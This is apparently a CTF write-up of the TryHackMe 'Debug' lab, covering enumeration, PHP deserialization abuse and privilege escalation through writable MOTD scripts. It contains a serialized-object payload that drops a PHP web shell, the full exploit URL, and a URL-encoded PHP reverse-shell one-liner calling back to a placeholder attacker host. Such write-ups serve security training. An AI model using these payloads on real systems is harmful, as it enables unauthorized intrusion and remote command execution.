# TRYHACKME — DEBUG

Linux Machine CTF! You’ll learn about enumeration, finding hidden password files and how to exploit php deserialization!

---

### TRYHACKME — DEBUG

![](https://cdn-images-1.medium.com/max/800/1*N_mYdnPv9SU3IcdnbDg2aw.jpeg)

Linux Machine CTF! You’ll learn about enumeration, finding hidden password files and how to exploit php deserialization!

Starting with a basic nmap scan:-

![](https://cdn-images-1.medium.com/max/800/1*3MAmWX8lnKaR9UijV-HydA.png)

2 open ports:-

22 ssh  
80 http

Visiting the webpage we see nothing interesting at first sight.

![](https://cdn-images-1.medium.com/max/800/1*vG_4Cv3tGTYWPPk_8zcG7g.png)

Interesting……

![](https://cdn-images-1.medium.com/max/800/1*-i4C1v2iUR3CZDbclx0G8A.png)![](https://cdn-images-1.medium.com/max/800/1*_Ft4wOilCvumUqPdPWg__g.png)

Lets check both the .bak files.

Downloading the index.php.bak file we get a long code.

Andd this is the most important part,

$debug = $\_GET[‘debug’] ?? ‘’;

$messageDebug = unserialize($debug);

This takes a debug parameter and deserialzes it without any input sanitization which can lead to RCE.

Simple PHP script to create a serialized payload.

<?php  
class FormSubmit {  
 public $form\_file = ‘shell.php’;  
 public $message = ‘<?php system($\_GET[“cmd”]); ?>’;  
}  
echo serialize(new FormSubmit());

Then run it using

php script.php

Copy the output, use the debug parameter on index.php

[http://10.49.167.160/index.php?debug=O:10:%22FormSubmit%22:2:%7Bs:9:%22form%5Ffile%22;s:9:%22shell%2Ephp%22;s:7:%22message%22;s:30:%22%3C?php%20system($%5FGET[%22cmd%22]);%20?%3E%22;%7D](http://10.49.167.160/index.php?debug=O:10:%22FormSubmit%22:2:%7Bs:9:%22form%5Ffile%22;s:9:%22shell%2Ephp%22;s:7:%22message%22;s:30:%22%3C?php%20system%28$%5FGET[%22cmd%22]%29;%20?%3E%22;%7D)

Now call the shell.php with a cmd parameter

<http://10.49.167.160/shell.php?cmd=id>

![](https://cdn-images-1.medium.com/max/800/1*gKSBbOpKJqBfDcB7thQVBA.png)

then get a shell using a php exec revshell payload

php%20-r%20%27%24sock%3Dfsockopen%28%22your\_ip%22%2Cyour\_port%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27

![](https://cdn-images-1.medium.com/max/800/1*9ccKysKQXU_lpQAm0Bv2rw.png)

Interesting, a .htpasswd file

![](https://cdn-images-1.medium.com/max/800/1*0rXiw3ziTurPQTEu0Oo_dw.png)

the hash couldn’t be cracked on crackstation.

After doing some i research i found out its an apache-apr hash, which can be cracked using john or hashcat.

![](https://cdn-images-1.medium.com/max/800/1*tKivjWSnHzrhtWQuwH_HlA.png)

Use these creds to login via ssh.

![](https://cdn-images-1.medium.com/max/800/1*Hby4TNQUKJ0Q0Nu1CYr9rQ.png)

I found a note in the home directory of the user james.

![](https://cdn-images-1.medium.com/max/800/1*AhDoCdXqXlRnyQHm4T2DlQ.png)

And also .bash\_history file.

![](https://cdn-images-1.medium.com/max/800/1*ouWIhajV1rGIapo0RTPz5Q.png)

cd /etc/update-motd.d/   
This is a message of the day directory, the text shown when a user logs in via SSH or opens a terminal (system info, updates available, etc.).

![](https://cdn-images-1.medium.com/max/800/1*iONNh1b9yLd9kaA39mnLeA.png)

Seems like i have write permissions, this can be used to edit the 00-header.

![](https://cdn-images-1.medium.com/max/800/1*Td0_6GuAQ8aGOOn_RJgdnA.png)

Now just use ssh to login again.

![](https://cdn-images-1.medium.com/max/800/1*SqBxdtMZpvWsxGIssdGEVw.png)

andd i am root now.

![](https://cdn-images-1.medium.com/max/800/1*izC0bidPTQsdQHX7KUSDzQ.png)

Thanks for reading!

By [Lightningfst](https://medium.com/@lightningfst8) on [July 23, 2026](https://medium.com/p/567678d97df3).

[Canonical link](https://medium.com/@lightningfst8/tryhackme-debug-567678d97df3)

Exported from [Medium](https://medium.com) on August 8, 2026.
